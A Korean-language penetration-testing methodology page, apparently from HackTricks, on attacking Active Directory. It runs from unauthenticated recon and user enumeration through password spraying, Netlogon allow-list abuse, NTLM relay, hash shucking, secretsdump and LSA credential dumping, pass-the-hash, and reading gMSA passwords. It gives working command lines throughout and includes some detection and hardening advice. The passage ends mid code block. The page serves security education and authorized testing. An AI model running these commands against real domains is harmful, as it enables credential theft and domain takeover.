# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 **네트워크 관리자**가 네트워크 내에서 **도메인**, **사용자**, **개체**를 효율적으로 만들고 관리할 수 있도록 하는 기반 기술입니다. 확장 가능하도록 설계되어 있어 방대한 수의 사용자를 관리하기 쉬운 **그룹**과 **하위 그룹**으로 구성하고, 여러 수준에서 **액세스 권한**을 제어할 수 있습니다.

**Active Directory** 구조는 세 가지 주요 계층인 **도메인**, **트리**, **포리스트**로 이루어져 있습니다. **도메인**은 공통 데이터베이스를 공유하는 **사용자** 또는 **장치**와 같은 개체의 모음입니다. **트리**는 공통 구조로 연결된 도메인들의 그룹이며, **포리스트**는 **트러스트 관계**를 통해 서로 연결된 여러 트리의 모음으로, 조직 구조의 최상위 계층을 구성합니다. 각 계층에서 특정 **액세스 권한**과 **통신 권한**을 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다.

1. **디렉터리** – Active Directory 개체에 관한 모든 정보를 보관합니다.
2. **개체** – 디렉터리 내의 **사용자**, **그룹**, **공유 폴더** 등의 엔터티를 의미합니다.
3. **도메인** – 디렉터리 개체를 담는 컨테이너입니다. 하나의 **포리스트**에 여러 도메인이 존재할 수 있으며, 각 도메인은 자체 개체 모음을 유지합니다.
4. **트리** – 공통 루트 도메인을 공유하는 도메인의 그룹입니다.
5. **포리스트** – Active Directory 조직 구조의 최상위 계층으로, 여러 트리와 그 사이의 **트러스트 관계**로 구성됩니다.

**Active Directory Domain Services (AD DS)**에는 네트워크 내 중앙 집중식 관리와 통신에 필수적인 다양한 서비스가 포함됩니다. 이 서비스는 다음과 같습니다.

1. **도메인 서비스** – 데이터 저장을 중앙 집중화하고 **사용자**와 **도메인** 간 상호작용을 관리하며, **인증** 및 **검색** 기능도 제공합니다.
2. **인증서 서비스** – 보안 **디지털 인증서**의 생성, 배포, 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP 프로토콜**을 통해 디렉터리를 사용하는 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 단일 세션에서 여러 웹 애플리케이션에 걸쳐 사용자를 인증할 수 있도록 **single sign-on** 기능을 제공합니다.
5. **Rights Management** – 저작권이 있는 자료의 무단 배포와 사용을 제어하여 보호합니다.
6. **DNS 서비스** – **도메인 이름** 확인에 필수적입니다.

자세한 설명은 [**TechTerms - Active Directory 정의**](https://techterms.com/definition/active_directory)를 참조하세요.

### **Kerberos 인증**

AD를 **attack**하는 방법을 배우려면 **Kerberos 인증 프로세스**를 제대로 **이해해야 합니다**.\
[**작동 방식을 아직 모른다면 이 페이지를 읽어 보세요.**](kerberos-authentication.md)

## 치트 시트

[https://wadcoms.github.io/](https://wadcoms.github.io)에서 AD를 열거하거나 exploit할 때 실행할 수 있는 명령을 빠르게 확인할 수 있습니다.

> [!WARNING]
> Kerberos 통신에서는 일반적으로 클라이언트가 올바른 SPN에 대한 티켓을 얻을 수 있도록 **정규화된 도메인 이름(FQDN)**이 필요합니다. IP 주소로 머신에 액세스하면 Kerberos 대신 NTLM으로 대체되는 경우가 많습니다.

## Active Directory 정찰 (No creds/sessions)

AD 환경에 액세스할 수 있지만 자격 증명이나 세션이 없다면 다음을 시도할 수 있습니다.

- **네트워크 Pentest:**
  - 네트워크를 스캔하고 머신과 열린 포트를 찾은 다음, 해당 머신의 **취약점을 exploit**하거나 **자격 증명을 추출**해 보세요(예: [프린터는 매우 흥미로운 대상이 될 수 있습니다](ad-information-in-printers.md)).
  - DNS 열거를 통해 도메인의 주요 서버(웹, 프린터, 공유 폴더, VPN, 미디어 등)에 관한 정보를 얻을 수 있습니다.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 이 작업을 수행하는 방법에 관한 자세한 내용은 일반 [**Pentesting 방법론**](../../generic-methodologies-and-resources/pentesting-methodology.md)을 참조하세요.
- **SMB 서비스에서 null 및 Guest 액세스 확인** (최신 Windows 버전에서는 작동하지 않습니다):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB 서버 열거 방법에 관한 자세한 안내는 여기에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP 열거**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP 열거 방법에 관한 자세한 안내는 여기에서 확인할 수 있습니다 (**익명 액세스에 특히 주의하세요**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **네트워크 포이즈닝**
  - [**Responder로 서비스를 사칭**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)하여 자격 증명 수집
  - [**relay attack을 악용**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)하여 호스트에 액세스
  - [**evil-S로 가짜 UPnP 서비스를 노출**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)하여 자격 증명 수집
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 도메인 환경 내부와 공개된 문서, 소셜 미디어, 서비스(주로 웹)에서 사용자 이름과 이름을 추출합니다.
  - 회사 직원의 전체 이름을 찾았다면 다양한 AD **사용자 이름 규칙(**[**여기 참조**](https://activedirectorypro.com/active-directory-user-naming-convention/))을 시도해 볼 수 있습니다. 가장 흔한 규칙은 _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, _임의의 영문자 3개와 임의의 숫자 3개_ (abc123)입니다.
  - 도구:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **익명 SMB/LDAP 열거:** [**SMB Pentest**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**LDAP Pentest**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute 열거**: **유효하지 않은 사용자 이름을 요청하면** 서버는 **Kerberos 오류** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_으로 응답하므로 사용자 이름이 유효하지 않음을 알 수 있습니다. **유효한 사용자 이름**에 대해서는 **AS-REP의 TGT** 또는 오류 _KRB5KDC_ERR_PREAUTH_REQUIRED_가 응답으로 반환됩니다. 후자는 사용자가 사전 인증을 수행해야 함을 나타냅니다.
- **MS-NRPC에 대한 인증 없음**: 도메인 컨트롤러의 MS-NRPC(Netlogon) 인터페이스에 auth-level = 1 (인증 없음)을 사용합니다. 이 방법은 MS-NRPC 인터페이스에 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 자격 증명 없이 사용자 또는 컴퓨터의 존재 여부를 확인합니다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 도구는 이러한 유형의 열거를 구현합니다. 관련 연구는 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>에서 확인할 수 있습니다.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 발견했다면 해당 서버를 대상으로 **user enumeration**도 수행할 수 있습니다. 예를 들어 [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)와 다른 repo([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 사용자 이름 목록을 찾을 수 있습니다.
>
> 하지만 그전에 수행했어야 하는 recon 단계에서 **회사에서 일하는 사람들의 이름**을 확보했어야 합니다. 이름과 성을 사용하면 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트로 유효할 가능성이 있는 사용자 이름을 생성할 수 있습니다.

### Netlogon 취약 채널 allow-list 악용 (Onelogon)

DC에 **Zerologon** 패치를 적용한 뒤에도, 명시적으로 allow-list에 포함된 계정은 **레거시/취약한 Netlogon 보안 채널 동작**에 여전히 노출될 수 있습니다. 위험한 구성은 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 또는 이에 대응하는 레지스트리 값 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**입니다.

이 값은 **SDDL 보안 설명자**입니다([Security Descriptors](security-descriptors.md) 참조). DACL에서 관련 ACE를 부여받은 계정이나 그룹은 모두 공격 대상이 될 수 있습니다. 예를 들어, `O:BAG:BAD:(A;;RC;;;WD)`는 사실상 **Everyone**을 allow-list에 포함합니다.

실무 작업 흐름:

1. **SYSVOL/GPO**와 **라이브 DC 레지스트리**를 모두 확인해 allow-list에 포함된 보안 주체를 식별합니다.
2. SDDL에서 발견한 SID를 실제 AD 사용자/컴퓨터로 확인하고 **DC 컴퓨터 계정**, **트러스트 계정**, 기타 권한이 높은 머신을 우선적으로 살펴봅니다.
3. allow-list에 포함된 계정으로 **MS-NRPC / Netlogon 인증**을 반복해서 시도합니다.
4. 추측에 성공하면 **Netlogon 비밀번호 설정** 기능을 악용해 대상 계정의 비밀번호를 재설정합니다(공개 PoC는 빈 문자열로 설정합니다).<sup>[[9]](#references)[[10]](#references)</sup>

공개 artifact를 이용한 빠른 분류 / lab 예시:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

참고:

- **scanner**가 유용한 이유는 유효한 allow-list가 **SYSVOL**, **registry** 또는 두 곳 모두에 있을 수 있기 때문입니다.
- 취약한 계정이 식별되면 **Domain Admin 권한 없이도** exploit 경로를 사용할 수 있다는 점이 중요합니다.
- **DC$** 같은 **Domain Controller machine account**를 장악하는 것은 특히 위험합니다. 해당 계정의 비밀번호를 재설정하면 더 광범위한 **AD takeover** 경로가 직접 열릴 수 있기 때문입니다.
- **Brute-force 가능성**은 모드에 따라 달라집니다. 공개된 자료에는 meet-in-the-middle 방식, 다른 computer account를 사용할 수 있을 때의 **24-bit** brute force, 그리고 더 느린 **32-bit** 방식이 설명되어 있습니다.

탐지 / 보안 강화 참고 사항:

- allow-list 정책을 감사하고, 임시로 명시적인 호환성 예외가 필요한 항목만 남기고 모두 제거하세요.
- DC의 **System** 이벤트 **5827/5828/5829/5830/5831**을 모니터링하여 취약한 Netlogon 연결이 거부되거나, 발견되거나, 정책에 따라 명시적으로 허용되는 상황을 탐지하세요.
- 레거시 의존성이 제거될 때까지 `VulnerableChannelAllowList`의 계정을 **고위험**으로 취급하세요.

### 하나 이상의 사용자 이름을 알고 있는 경우

이미 유효한 사용자 이름은 알고 있지만 비밀번호는 모른다고 가정해 보겠습니다. 다음을 시도해 보세요.

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않으면**, 해당 사용자의 **AS_REP 메시지를 요청**할 수 있습니다. 이 메시지에는 사용자 비밀번호를 기반으로 파생된 값으로 암호화된 데이터가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견한 사용자마다 가장 **흔한 비밀번호**를 시도해 보세요. 약한 비밀번호를 사용하는 사용자가 있을 수 있습니다(비밀번호 정책을 유념하세요!).
  - 사용자의 메일 서버에 접근하기 위해 **OWA 서버에 spray**할 수도 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**network**의 일부 프로토콜에 **poisoning**을 수행하면 crack할 수 있는 challenge **hashes**를 **얻을** 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory 열거를 통해 사용자 이름, 이메일 식별자 및 명명 패턴, 후보 호스트, 그리고 인증을 유도할 수 있는 서비스를 파악할 수 있습니다. 이 정보를 활용해 실행 가능한 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)와 AD 환경으로 진입할 가능성이 있는 경로를 식별하세요.

### NetExec workspace 기반 recon 및 relay 보안 상태 확인

- **`nxcdb` workspaces**를 사용해 각 engagement의 AD recon 상태를 별도로 관리하세요. `workspace create <name>`을 실행하면 `~/.nxc/workspaces/<name>` 아래에 프로토콜별 SQLite DB(smb/mssql/winrm/ldap 등)가 생성됩니다. `proto smb|mssql|winrm`으로 보기를 전환하고 `creds`로 수집한 secret을 확인하세요. 작업이 끝나면 민감한 데이터를 직접 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**를 사용해 서브넷을 빠르게 탐색하면 **domain**, **OS build**, **SMB signing 요구 사항**, **Null Auth**를 확인할 수 있습니다. `(signing:False)`로 표시된 멤버는 **relay에 취약할 수 있으며**, DC는 대개 signing을 요구합니다.
- NetExec 출력에서 직접 **/etc/hosts의 호스트 이름**을 생성하여 타깃팅을 쉽게 하세요:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- **SMB relay to the DC가 signing으로 차단된 경우에도** **LDAP** 보안 상태를 확인하세요. `netexec ldap <dc>`는 `(signing:None)` / 약한 channel binding을 표시합니다. SMB signing이 필수지만 LDAP signing이 비활성화된 DC는 **SPN-less RBCD** 같은 공격에 사용할 수 있는 **relay-to-LDAP** 대상입니다.

### 클라이언트 측 프린터 credential leaks → 대량 도메인 자격 증명 검증

- 프린터/웹 UI의 HTML에 마스킹된 관리자 비밀번호가 **포함되어 있는 경우가 있습니다**. 소스 보기/devtools에서 평문을 확인할 수 있으며(예: `<input value="<password>">`), 이를 이용해 Basic-auth로 스캔/인쇄 저장소에 접근할 수 있습니다.
- 가져온 인쇄 작업에 사용자별 비밀번호가 포함된 **평문 온보딩 문서**가 있을 수 있습니다. 테스트할 때는 계정과 비밀번호의 대응 관계를 유지하세요:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM 자격 증명 탈취

**null 또는 guest 사용자**로 **다른 PC나 공유에 액세스**할 수 있다면, 파일(예: SCF 파일)을 **배치**할 수 있습니다. 해당 파일에 누군가 접근하면 당신을 상대로 NTLM 인증을 **유발**하여 **NTLM challenge**를 **탈취**할 수 있습니다.


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking 및 NT-Candidate 공격

**Hash shucking**은 이미 보유한 모든 NT hash를, 키 자료가 NT hash에서 직접 파생되는 다른 느린 형식의 후보 비밀번호로 취급합니다. Kerberos RC4 티켓, NetNTLM challenge 또는 캐시된 자격 증명을 대상으로 긴 passphrase를 brute-force하는 대신, NT hash를 Hashcat의 NT-candidate 모드에 입력하여 평문을 알아내지 않고도 비밀번호 재사용 여부를 검증할 수 있습니다. 현재 및 과거의 NT hash를 수천 개 수집할 수 있는 도메인 침해 이후에 특히 효과적입니다.<sup>[[5]](#references)</sup>

다음과 같은 경우 shucking을 사용하세요.

- DCSync, SAM/SECURITY 덤프 또는 자격 증명 저장소에서 NT hash 모음을 확보했고, 다른 도메인/forest에서 재사용되는지 확인해야 하는 경우
- RC4 기반 Kerberos 자료(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답 또는 DCC/DCC2 blob을 캡처한 경우
- 해독할 수 없는 긴 passphrase의 재사용을 빠르게 입증한 다음 Pass-the-Hash로 즉시 피벗하려는 경우

이 기술은 키가 NT hash가 아닌 암호화 유형(예: Kerberos etype 17/18 AES)에는 **작동하지 않습니다**. 도메인에서 AES만 허용한다면 일반 password 모드로 돌아가야 합니다.

#### NT hash 모음 만들기

- **DCSync/NTDS** – `secretsdump.py`에서 history 옵션을 사용해 가능한 한 많은 NT hash와 이전 값을 가져옵니다:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History 항목은 계정당 최대 24개의 이전 해시를 Microsoft가 저장할 수 있기 때문에 후보 풀을 크게 넓혀 줍니다. NTDS secrets를 수집하는 다른 방법은 다음을 참조하세요.

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)를 사용하면 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그온 정보(DCC/DCC2)를 추출할 수 있습니다. 중복을 제거한 뒤 해당 해시를 같은 `nt_candidates.txt` 목록에 추가하세요.
- **메타데이터 추적** – 각 해시를 만든 사용자 이름/도메인을 기록하세요(단어 목록에 16진수만 포함되어 있더라도). Hashcat에서 일치하는 해시의 비밀번호 후보가 나오면, 어떤 principal이 비밀번호를 재사용하는지 즉시 알 수 있습니다.
- shucking 시 중복 가능성을 극대화하려면 같은 forest 또는 신뢰하는 forest의 후보를 우선 사용하세요.

#### Hashcat NT-candidate 모드

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

참고:

- NT-candidate 입력은 **가공되지 않은 32자리 16진수 NT 해시**여야 합니다. 규칙 엔진을 비활성화하세요(`-r` 사용 금지, 하이브리드 모드 사용 금지). 변형 작업으로 후보 키 자료가 손상될 수 있습니다.
- 이 모드 자체가 더 빠른 것은 아니지만, NTLM 키 공간(~30,000 MH/s on an M3 Max)은 Kerberos RC4(~300 MH/s)보다 ~100배 빠릅니다. 큐레이션한 NT 목록을 테스트하는 편이 느린 형식에서 전체 비밀번호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- **최신 Hashcat 빌드**를 항상 사용하세요(`git clone https://github.com/hashcat/hashcat && make install`). 모드 31500/31600/35300/35400은 최근에 추가되었습니다.<sup>[[7]](#references)</sup>
- 현재 AS-REQ Pre-Auth용 NT 모드는 없습니다. AES etype(19600/19700)는 키가 원시 NT 해시가 아닌 UTF-16LE 비밀번호에서 PBKDF2를 통해 파생되므로 평문 비밀번호가 필요합니다.

#### 예시 – Kerberoast RC4 (모드 35300)

1. 낮은 권한의 사용자로 대상 SPN의 RC4 TGS를 캡처합니다(자세한 내용은 Kerberoast 페이지 참조).

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT list를 사용해 ticket을 shuck합니다:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat은 각 NT 후보에서 RC4 키를 유도하고 `$krb5tgs$23$...` blob을 검증합니다. 일치하면 해당 서비스 계정이 기존 NT hash 중 하나를 사용한다는 뜻입니다.

3. 즉시 PtH로 pivot:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   필요한 경우 나중에 `hashcat -m 1000 <matched_hash> wordlists/`를 사용해 평문을 복구할 수 있습니다.

#### 예시 – 캐시된 자격 증명 (mode 31600)

1. 침해된 워크스테이션에서 캐시된 로그온 정보를 덤프합니다:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 관심 대상 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`에 복사한 다음 shuck합니다:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 일치에 성공하면 목록에서 이미 알고 있던 NT hash가 반환되므로, 캐시된 사용자가 같은 비밀번호를 재사용하고 있음을 입증할 수 있습니다. 해당 hash를 PtH에 바로 사용하거나 (`nxc smb <dc_ip> -u highpriv -H <hash>`), 빠른 NTLM 모드로 brute-force하여 비밀번호 문자열을 복구하세요.

NetNTLM challenge-response (`-m 27000/27100`) 및 DCC (`-m 31500`)에도 정확히 같은 workflow를 적용할 수 있습니다. 일치 항목을 찾으면 relay, SMB/WMI/WinRM PtH를 시작하거나 오프라인에서 mask/rule을 사용해 NT hash를 다시 crack할 수 있습니다.



## 자격 증명/세션을 이용한 Active Directory 열거

이 단계에서는 **유효한 도메인 계정의 자격 증명이나 세션을 침해해야 합니다.** 유효한 자격 증명이나 도메인 사용자 권한의 shell이 있다면, **앞서 소개한 방법으로 다른 사용자도 침해할 수 있다는 점을 기억하세요.**

인증된 열거를 시작하기 전에 **Kerberos double-hop 문제**를 이해하세요.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 열거

계정 침해는 **도메인 평가를 위한 중요한 단계**입니다. 인증된 **Active Directory 열거**가 가능해지기 때문입니다.

[**ASREPRoast**](asreproast.md)와 관련해서는 취약할 가능성이 있는 모든 사용자를 찾을 수 있으며, [**Password Spraying**](password-spraying.md)과 관련해서는 **모든 사용자 이름 목록**을 확보하고 침해한 계정의 비밀번호, 빈 비밀번호 및 새로 발견한 유망한 비밀번호를 시도할 수 있습니다.

- [**기본 정찰을 수행하는 CMD**](../basic-cmd-for-pentesters.md#domain-info)를 사용할 수 있습니다.
- [**powershell을 이용한 정찰**](../basic-powershell-for-pentesters/index.html)도 가능합니다. 이 방법은 더 은밀합니다.
- [**powerview 사용**](../basic-powershell-for-pentesters/powerview.md)으로 더 자세한 정보를 추출할 수도 있습니다.
- Active Directory에서 정찰에 사용할 수 있는 또 다른 훌륭한 도구는 [**BloodHound**](bloodhound.md)입니다. (사용하는 수집 방식에 따라) **그다지 은밀하지는 않지만**, **은밀성이 중요하지 않다면** 꼭 사용해 보세요. 사용자가 RDP할 수 있는 위치와 다른 그룹으로 이어지는 경로 등을 찾을 수 있습니다.
  - **그 밖의 자동화된 AD 열거 도구:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- 흥미로운 정보가 있을 수 있는 [**AD의 DNS 레코드**](ad-dns-records.md)를 살펴보세요.
- GUI를 사용하는 디렉터리 열거 도구로는 **SysInternal** Suite의 **AdExplorer.exe**가 있습니다.
- **ldapsearch**로 LDAP 데이터베이스를 검색해 _userPassword_ 및 _unixUserPassword_ 필드에 있는 자격 증명이나 사용자 _description_ 및 _info_ 메모를 찾아볼 수도 있습니다. _info_에 표시되지 않은 비밀번호 형태의 문자열이 있더라도 후보일 뿐입니다. 용도와 유효성을 별도로 확인하고, 일반적인 열거 결과에 메모 내용을 포함하지 마세요. 다른 방법은 PayloadsAllTheThings의 [PayloadsAllTheThings에서 다룬 AD 사용자 comment의 비밀번호](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)를 참고하세요.
- 권한이 허용되는 경우 `\\<dc>\NETLOGON` 또는 `\\<dc>\SYSVOL\<domain>\scripts`에 있는 **접근 가능한** 도메인 로그온 및 드라이브 매핑 스크립트를 검토하세요. Microsoft는 [문서](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)에서 NETLOGON share가 스크립트 디렉터리 역할을 한다고 설명합니다. 먼저 이름을 나열한 다음 크기 제한을 두고 관련성이 있으며 읽을 수 있는 스크립트만 확인하세요. 일반적인 열거 중에 share 전체를 덤프하거나 자격 증명 값을 출력하지 마세요. PowerShell의 [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) 호출은 스크립트에 저장된 평문 비밀번호를 **보호하지 않습니다**. 이 호출만으로 비밀 값이 하드코딩되어 있다고 단정할 수는 없습니다. 실제 입력값을 추적한 다음 계정, 자격 증명의 유효성 및 권한을 별도로 확인하세요. 도메인 스크립트 검토는 원격 share 검토이며 로컬 호스트 열거와는 별개입니다.
- **Linux**를 사용한다면 [**pywerview**](https://github.com/the-useless-one/pywerview)로 도메인을 열거할 수도 있습니다.
- 다음과 같은 자동화 도구도 사용해 볼 수 있습니다.
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출**

  Windows에서는 도메인 사용자 이름을 모두 쉽게 가져올 수 있습니다 (`net user /domain` ,`Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 다음을 사용할 수 있습니다. `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`

> 이 열거 섹션은 짧아 보일 수 있지만 전체 과정에서 가장 중요한 부분입니다. 링크(특히 cmd, powershell, powerview 및 BloodHound 항목)를 살펴보고, 도메인 열거 방법을 익힌 뒤 익숙해질 때까지 연습하세요. 평가 중에는 DA에 도달할 경로를 찾거나 아무것도 할 수 없다고 판단하는 데 이 과정이 핵심이 됩니다.

### 예측 가능한 사전 생성 컴퓨터 계정 -> gMSA 비밀번호 접근

기존 방식의 도메인 가입을 위해 미리 준비된 컴퓨터 계정은 예측 가능한 초기 비밀번호를 유지할 수 있습니다. NetExec의 `pre2k` 모듈은 특징적인 `userAccountControl` 값 `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`)을 식별하고, 뒤에 붙은 `$`를 제외한 소문자 컴퓨터 이름의 첫 14자를 사용해 Kerberos TGT를 요청합니다. 이 UAC 값을 후보를 선별하는 기준으로 취급하세요. **Pre-Windows 2000 Compatible Access**의 구성원이라는 이유만으로 비밀번호가 취약하다고 단정해서는 안 됩니다.<sup>[[18]](#references)[[20]](#references)</sup>

인증된 LDAP 열거를 사용해 후보를 테스트하고, 성공적으로 얻은 TGT를 저장하세요. `ALL=True`를 지정하면 기본 `4128` 필터에 해당하는 객체 이외의 객체까지 테스트 범위가 넓어집니다.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

기본/NTLM 바인드가 실패해도 **이 결과가 무효가 되는 것은 아닙니다**. `-k` 옵션과 DC로 확인되는 FQDN을 사용하고, KDC와 시계를 동기화해 테스트하세요. 성공적으로 실행된 모듈은 후보 목록과 획득한 ccache를 `~/.nxc/modules/pre2k/` 아래에 저장합니다.<sup>[[18]](#references)[[20]](#references)</sup>

컴퓨터 principal을 침해한 후에는 중첩된 그룹 멤버십과 아웃바운드 권한을 그래프로 확인하세요. 특히 gMSA의 `msDS-GroupMSAMembership` 보안 설명자에 지정된 principal은 `msDS-ManagedPassword`를 읽을 수 있습니다. NetExec의 `--gmsa` 출력은 허용된 principal을 보여 주며, 인증하는 컴퓨터에 권한이 있으면 현재 NT hash를 반환합니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

